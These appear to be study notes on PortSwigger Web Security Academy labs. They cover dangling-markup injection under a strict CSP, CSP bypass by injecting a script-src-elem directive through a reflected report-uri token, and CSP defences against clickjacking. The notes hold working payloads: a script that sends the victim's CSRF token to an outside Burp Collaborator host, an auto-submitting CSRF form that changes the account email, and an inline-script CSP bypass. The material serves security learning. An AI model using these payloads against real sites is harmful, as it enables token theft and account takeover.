### Lab: Reflected XSS protected by very strict CSP, with dangling markup attack
After we've logged in, we hit the endpoint:
```
https://0a2d006004c50adc80a335c400d10074.web-security-academy.net/my-account?id=wiener
```
On the page that we get back, we have the following:
```bash
<form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
    <label>Email</label>
    <input required="" type="email" name="email" value="">
    <input required="" type="hidden" name="csrf" value="v7Xx9rRq52EkoS8VjyKPWcFALllqY5zc">
    <button class="button" type="submit"> Update email </button>
</form>
```
It turns out if we add `&email=22` to the url, we see that it is reflected in the value of the email input:
```
https://0a2d006004c50adc80a335c400d10074.web-security-academy.net/my-account?id=wiener&email=22
```
```bash
<input required="" type="email" name="email" value="22">
```
With that knowledge we can try to break out of that email input element, and we try to inject e.g. an `<img>` element. 

We use the following payload: `"><img src="https://www.google.com/someimage"` but we have to **url encode** it.
```
https://0a2d006004c50adc80a335c400d10074.web-security-academy.net/my-account?id=wiener&email=%22%3e%3c%69%6d%67%20%73%72%63%3d%22%68%74%74%70%73%3a%2f%2f%77%77%77%2e%67%6f%6f%67%6c%65%2e%63%6f%6d%2f%73%6f%6d%65%69%6d%61%67%65%22
```
It worked. A new img element appeared on the page.
We also got the following err: `Refused to load the image 'https://www.google.com/someimage' because it violates the following Content Security Policy directive: "img-src 'self'"`

Because of the csp we can't really load external images. But we can anyway expect user to click on some button that we inject. So we try the following (we have to url encode, but here we're not doing it for the sake of readability):
```bash
...&email="><a href="http://localhost:3000">Click me</a><base target=haha>
```
`<base target=haha>` here plays an important role. When user clicks on "Click me" they are redirected to `http://localhost:3000`. (of course we can use malicious website instead of localhost) 
On malicious website (on localhost in our case) inside of dev tools when we write `window.name` we see `haha` returned. `haha` was specified as `target` in `<base target="haha">`

Now let's try dangling markup vulnerability:
It's important to remember what the initial page's html elements are:
```bash
<form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
    <label>Email</label>
    <input required="" type="email" name="email" value="">
    <input required="" type="hidden" name="csrf" value="v7Xx9rRq52EkoS8VjyKPWcFALllqY5zc">
    <button class="button" type="submit"> Update email </button>
</form>
```

So in the url we specify the following (of course url encoded version of it):
```bash
...&email="><a href="http://localhost:3000">Click me</a><base target='
```
And when we navigate to malicious website (`localhost` in this case) and in the console we type `window.name`, we then see the following:
```bash
'">\n <input required type="hidden" name="csrf" value="v7Xx9rRq52EkoS8VjyKPWcFALllqY5zc"><button class='
```
> Note: the technique above no longer works on port swigger academy, the lab has been updated. But the technique above is still important to understand, that's why it is described here

#### Working solution:
So this is what we have in the beginning:
```bash
<form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
    <label>Email</label>
    <input required="" type="email" name="email" value="">
    <input required="" type="hidden" name="csrf" value="v7Xx9rRq52EkoS8VjyKPWcFALllqY5zc">
    <button class="button" type="submit"> Update email </button>
</form>
```

Then on exploit server we'll have the following script (i.e. we close existing form and open a new one. New form is going to contain csrf input):
```bash
<script>
     window.location = 'https://0a2f00400490e2b598fea0a000260019.web-security-academy.net/my-account?email=any"></form><form name="myForm" action="https://od5uidti3zskabyg72f25lcrpiv9jz7o.oastify.com" method="GET"><button class="button" type="submit">Click</button'
</script>
```

That script above will change the page, so that now it includes 2 forms and 2 buttons:
```bash
<form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
    <label>Email</label>
    <input required type="email" name="email" value="">
</form>
<form name="myForm" action="https://od5uidti3zskabyg72f25lcrpiv9jz7o.oastify.com" method="GET"><button type="submit" class="button">Click</button">
    <input required type="hidden" name="csrf" value="oEKUbXmXgNrmUZMcaY4uw8vAA3uKZRSt">
    <button class='button' type='submit'> Update email </button>
</form>
```
When user clicks on "Click" button - csrf token is sent to the burp collab server
Later we construct another attack to change the user's email with the csrf token that we got
Here's csrf:
```bash
<form action="https://0a2f00400490e2b598fea0a000260019.web-security-academy.net/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="hacker@evil-user.net" />
  <input type="hidden" name="csrf" value="Ip2utiucfdIVGJoO1rUm14DVnEvVOvJy" />
  <input type="submit" value="Submit request" />
</form>
<script>
  history.pushState('', '', '/');
  document.forms[0].submit();
</script>
```

## Mitigating dangling markup attacks using CSP
The following directive will only allow images to be loaded from the same origin as the page itself:
```
img-src 'self'
```
The following directive will only allow images to be loaded from a specific domain:
```
img-src https://images.normal-website.com
```
Note that these policies will prevent some dangling markup exploits, because an easy way to capture data with no user interaction is using an img tag. However, it will not prevent other exploits, such as those that inject an anchor tag with a dangling href attribute.

## Bypassing CSP with policy injection
### Lab: Reflected XSS protected by CSP, with CSP bypass
There's an input for the website's search. 
Whatever we type into the input is reflected into the DOM (i.e. we've got reflected XSS there).

However when we try to inject into the search input
```bash
<img src=1 onerror=alert(1)>
```
we see that the payload is reflected, but the CSP prevents the inline script from executing

So there's an endpoint:
```
https://0a1200820303ea24811061a4003f001c.web-security-academy.net/?search=vv
```
In the response there's:
```
Content-Security-Policy: default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=
```
We're interested in `report-uri /csp-report?token=`

You may encounter a website that reflects input into the actual policy, most likely in a report-uri directive. If the site reflects a parameter that you can control, you can inject a semicolon to add your own CSP directives. Usually, this report-uri directive is the final one in the list. This means you will need to overwrite existing directives in order to exploit this vulnerability and bypass the policy.

It turns out that if we modify the endpoint above, i.e. add additional query parameter with the name `token` then the value of it will be reflected in the response CSP header
Req:
```
https://0a1200820303ea24811061a4003f001c.web-security-academy.net/?search=vv&token=ff
```
Res:
```
Content-Security-Policy: default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=ff
```

Normally, it's not possible to overwrite an existing script-src directive. However, Chrome recently introduced the `script-src-elem` directive, which allows you to control script elements, but not events. Crucially, this new directive allows you to overwrite existing script-src directives

Therefore to execute inline script we do the following:
```
https://0a1200820303ea24811061a4003f001c.web-security-academy.net/?search=<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'
```
We actually need to url encode it:
```
https://0a1200820303ea24811061a4003f001c.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27
```

## Protecting against clickjacking using CSP
The following directive will only allow the page to be framed by other pages from the same origin:
```bash
frame-ancestors 'self'
```
The following directive will prevent framing altogether:
```bash
frame-ancestors 'none'
```
Using content security policy to prevent clickjacking is more flexible than using the X-Frame-Options header because you can specify multiple domains and use wildcards. For example:
```bash
frame-ancestors 'self' https://normal-website.com https://*.robust-website.com
```
CSP also validates each frame in the parent frame hierarchy, whereas X-Frame-Options only validates the top-level frame.

Using CSP to protect against clickjacking attacks is recommended. You can also combine this with the X-Frame-Options header to provide protection on older browsers that don't support CSP, such as Internet Explorer.

